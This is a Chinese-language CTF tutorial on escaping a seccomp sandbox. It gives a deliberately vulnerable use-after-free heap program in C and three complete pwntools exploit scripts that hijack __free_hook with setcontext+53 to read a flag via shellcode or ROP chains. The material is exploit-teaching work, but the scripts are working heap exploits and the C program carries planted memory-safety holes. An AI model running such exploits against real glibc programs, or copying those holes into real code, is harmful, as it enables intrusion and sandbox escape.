这里因为重点在于沙箱的绕过，漏洞就拿了一个最简单的uaf做演示。

最主要的是setcontext这个函数，可以看到setcontext+53之后控制了大量的寄存器（可以看作就是一个SigreturnFrame），寻址都是[rdi+x]的方式，那么我们假如劫持了free_hook为setcontext+53，此时rdi刚好是堆块内容的地址，我们可以直接放个SigreturnFrame进去，之后利用的话就按个人喜好了。我写了三种方式，本质都是orw。

1.mprotect+shellcode

2.rop（rop地址在free_hook附近）

3.rop（rop地址在heap上）



setcontext的汇编

```
   0x7ffff7a34180 <setcontext>:	push   rdi
   0x7ffff7a34181 <setcontext+1>:	lea    rsi,[rdi+0x128]
   0x7ffff7a34188 <setcontext+8>:	xor    edx,edx
   0x7ffff7a3418a <setcontext+10>:	mov    edi,0x2
   0x7ffff7a3418f <setcontext+15>:	mov    r10d,0x8
   0x7ffff7a34195 <setcontext+21>:	mov    eax,0xe
   0x7ffff7a3419a <setcontext+26>:	syscall 
   0x7ffff7a3419c <setcontext+28>:	pop    rdi
   0x7ffff7a3419d <setcontext+29>:	cmp    rax,0xfffffffffffff001
   0x7ffff7a341a3 <setcontext+35>:	jae    0x7ffff7a34200 <setcontext+128>
   0x7ffff7a341a5 <setcontext+37>:	mov    rcx,QWORD PTR [rdi+0xe0]
   0x7ffff7a341ac <setcontext+44>:	fldenv [rcx]
   0x7ffff7a341ae <setcontext+46>:	ldmxcsr DWORD PTR [rdi+0x1c0]
   0x7ffff7a341b5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
   0x7ffff7a341bc <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
   0x7ffff7a341c3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
   0x7ffff7a341c7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
   0x7ffff7a341cb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
   0x7ffff7a341cf <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
   0x7ffff7a341d3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
   0x7ffff7a341d7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
   0x7ffff7a341de <setcontext+94>:	push   rcx
   0x7ffff7a341df <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
   0x7ffff7a341e3 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
   0x7ffff7a341ea <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
   0x7ffff7a341f1 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
   0x7ffff7a341f5 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
   0x7ffff7a341f9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x7ffff7a341fd <setcontext+125>:	xor    eax,eax
   0x7ffff7a341ff <setcontext+127>:	ret    
   0x7ffff7a34200 <setcontext+128>:	mov    rcx,QWORD PTR [rip+0x398c61]        # 0x7ffff7dcce68
   0x7ffff7a34207 <setcontext+135>:	neg    eax
   0x7ffff7a34209 <setcontext+137>:	mov    DWORD PTR fs:[rcx],eax
   0x7ffff7a3420c <setcontext+140>:	or     rax,0xffffffffffffffff
   0x7ffff7a34210 <setcontext+144>:	ret
```



题目源码test.c

gcc -o test test.c

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
int Nodes_len[0x10];
char *Nodes[0x10];
int count=0;
int get_atoi()
{
	char buf[8];
	read(0,buf,8);	
	return atoi(buf);
}
void sandbox(){
	struct sock_filter filter[] = {
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
	BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
	BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
	BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
	BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
	};
	struct sock_fprog prog = {
	.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
	.filter = filter,
	};
	prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
void add(){
	int len;
	printf("len:");
	scanf("%d",&len);
	if(len<0||len>0xfff) exit(0);
	if(count>0x10){
		puts("too many");
		exit(0);
	}
	Nodes[count] = malloc(len);
	Nodes_len[count] = len;
	count++;
	puts("done!");
}

void del(){
	int idx;
	printf("idx:");
	scanf("%d",&idx);
	if(idx>count){
		puts("error!");
		exit(0);
	}
	free(Nodes[idx]);
	puts("done!");	
}

void edit(){
	int idx;
	printf("idx:");
	scanf("%d",&idx);
	if(idx>count){
		puts("error!");
		exit(0);
	}
	read(0,Nodes[idx],Nodes_len[idx]);
	puts("done!");
}
void show(){
	int idx;
	printf("idx:");
	scanf("%d",&idx);
	if(idx>count){
		puts("error!");
		exit(0);
	}
	write(1,Nodes[idx],Nodes_len[idx]);
}
void gift(){
	printf("heap_base:%p\n",Nodes[0]);
}
void menu(){
	puts("1.add");
	puts("2.delete");
	puts("3.edit");
	puts("4.show");
	puts("5.gift");
	puts("6.exit");
	printf("choice:");
}
void init() {
	setvbuf(stdin, 0LL, 2, 0LL);
	setvbuf(stdout, 0LL, 2, 0LL);
	setvbuf(stderr, 0LL, 2, 0LL);
}

int main(){
	init();
	sandbox();
	while(1){
		int choice;
		menu();
		choice = get_atoi();
		switch(choice){
			case 1:
				add();
				break;
			case 2:
				del();
				break;
			case 3:
				edit();
				break;
			case 4:
				show();
				break;
			case 5:
				gift();
				break;
			default:
				puts("invalued input!");
				exit(0); 
		}
	}
	return 0;
} 
```



方法一

mprotect+shellcode

```python
from pwn import*
context.log_level = 'debug'
p = process('./test')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./test')
context.arch = elf.arch
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))
def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)
def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))
add(0x500) #0
add(0x10) #1
delete(0)
show(0)

leak = u64(p.recv(6)+'\x00'*2)
libcbase = leak - (0x7f3490493ca0-0x7f34900a8000)
setcontext_door = libcbase + libc.sym['setcontext']+53
free_hook = libcbase + libc.sym['__free_hook']
syscall = libcbase +0xd2745
pr('libcbase',libcbase)


delete(1)
edit(1,p64(free_hook))
add(0x10)#2
add(0x10)#3
edit(3,p64(setcontext_door))
#=========================setcontext===========================

fake_rsp = free_hook&0xfffffffffffff000
frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=fake_rsp
frame.rdx=0x2000
frame.rsp=fake_rsp
frame.rip=syscall

add(0x100) #4
edit(4,str(frame))
#gdb.attach(p,'b *'+str(setcontext_door))
delete(4)

#==========================orw=================================
prdi_ret = libcbase+libc.search(asm("pop rdi\nret")).next()
prsi_ret = libcbase+libc.search(asm("pop rsi\nret")).next()
prdx_ret = libcbase+libc.search(asm("pop rdx\nret")).next()
prax_ret = libcbase+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libcbase+libc.search(asm("jmp rsp")).next()
mprotect_addr = libcbase + libc.sym['mprotect']

payload = p64(prdi_ret)+p64(fake_rsp)
payload += p64(prsi_ret)+p64(0x1000)
payload += p64(prdx_ret)+p64(7)
payload += p64(prax_ret)+p64(10)
payload += p64(syscall) #mprotect(fake_rsp,0x1000,7)
payload += p64(jmp_rsp)
payload += asm(shellcraft.open('flag'))
payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30))
payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30))
p.send(payload)
#pause()

p.interactive()

```



方法二

rop（rop地址在free_hook附近）

```python
from pwn import*
context.log_level = 'debug'
p = process('./test')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./test')
context.arch = elf.arch
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))
def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)
def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))
add(0x500) #0
add(0x10) #1
delete(0)
show(0)

leak = u64(p.recv(6)+'\x00'*2)
libcbase = leak - (0x7f3490493ca0-0x7f34900a8000)
setcontext_door = libcbase + libc.sym['setcontext']+53
free_hook = libcbase + libc.sym['__free_hook']
syscall = libcbase +0xd2745
pr('libcbase',libcbase)


delete(1)
edit(1,p64(free_hook))
add(0x10)#2
add(0x10)#3
edit(3,p64(setcontext_door))
#=========================setcontext===========================

frame = SigreturnFrame()
frame.rax=0
frame.rdi=0
frame.rsi=free_hook&0xfffffffffffff000
frame.rdx=0x2000
frame.rsp=free_hook&0xfffffffffffff000
frame.rip=syscall

add(0x100) #4
edit(4,str(frame))
#gdb.attach(p,'b *'+str(setcontext_door))
delete(4)

#==========================orw=================================
prdi_ret = libcbase+libc.search(asm("pop rdi\nret")).next()
prsi_ret = libcbase+libc.search(asm("pop rsi\nret")).next()
prdx_ret = libcbase+libc.search(asm("pop rdx\nret")).next()
def ropchain(function,arg1,arg2,arg3):
	ret  = p64(prdi_ret)+p64(arg1)
	ret += p64(prsi_ret)+p64(arg2)
	ret += p64(prdx_ret)+p64(arg3)
	ret += p64(function)
	return ret
read_addr = libcbase + libc.sym['read']
open_addr = libcbase + libc.sym['open']
write_addr = libcbase + libc.sym['write']
flag_string_addr = (free_hook&0xfffffffffffff000)+0x200
payload = ropchain(read_addr,0,flag_string_addr,0x10)
payload += ropchain(open_addr,flag_string_addr,0,0)
payload += ropchain(read_addr,3,flag_string_addr,0x30)
payload += ropchain(write_addr,1,flag_string_addr,0x30)
p.send(payload)
pause()
p.send('./flag')
p.interactive()

```





方法三（需要泄露堆地址）

rop（rop地址在heap上）

```python
from pwn import*
context.log_level = 'debug'
p = process('./test')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./test')
context.arch = elf.arch
def pr(a,addr):
	log.success(a+'====>'+hex(addr))
def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))
def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)
def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))
add(0x500) #0
add(0x10) #1
delete(0)
show(0)

leak = u64(p.recv(6)+'\x00'*2)
p.sendlineafter(':','5')
p.recvuntil('heap_base:')
heapbase = int(p.recvuntil('\n')[:-1],16)-0x260
libcbase = leak - (0x7f3490493ca0-0x7f34900a8000)
setcontext_door = libcbase + libc.sym['setcontext']+53
free_hook = libcbase + libc.sym['__free_hook']
syscall = libcbase +0xd2745
pr('libcbase',libcbase)
pr('heapbase',heapbase)


delete(1)
edit(1,p64(free_hook))
add(0x10)#2
add(0x10)#3
edit(3,p64(setcontext_door))
#=========================setcontext===========================
prdi_ret = libcbase+libc.search(asm("pop rdi\nret")).next()
prsi_ret = libcbase+libc.search(asm("pop rsi\nret")).next()
prdx_ret = libcbase+libc.search(asm("pop rdx\nret")).next()
def ropchain(function,arg1,arg2,arg3):
	ret  = p64(prdi_ret)+p64(arg1)
	ret += p64(prsi_ret)+p64(arg2)
	ret += p64(prdx_ret)+p64(arg3)
	ret += p64(function)
	return ret
read_addr = libcbase + libc.sym['read']
open_addr = libcbase + libc.sym['open']
write_addr = libcbase + libc.sym['write']


context_addr = heapbase + 0x260
flag_string_addr = context_addr + 0x200
frame = SigreturnFrame()
frame.rsp = context_addr+0xf8
frame.rip = libcbase+libc.search(asm("ret")).next()
payload = str(frame)
payload += ropchain(open_addr,flag_string_addr,0,0)
payload += ropchain(read_addr,3,flag_string_addr,0x30)
payload += ropchain(write_addr,1,flag_string_addr,0x30)
payload = payload.ljust(0x200,'\x00')+'./flag\x00'

add(0x300) #4
edit(4,payload)
#gdb.attach(p,'b *'+str(setcontext_door))

delete(4)

p.interactive()

```



参考文章

https://blog.csdn.net/carol2358/article/details/108351308?spm=1001.2014.3001.5506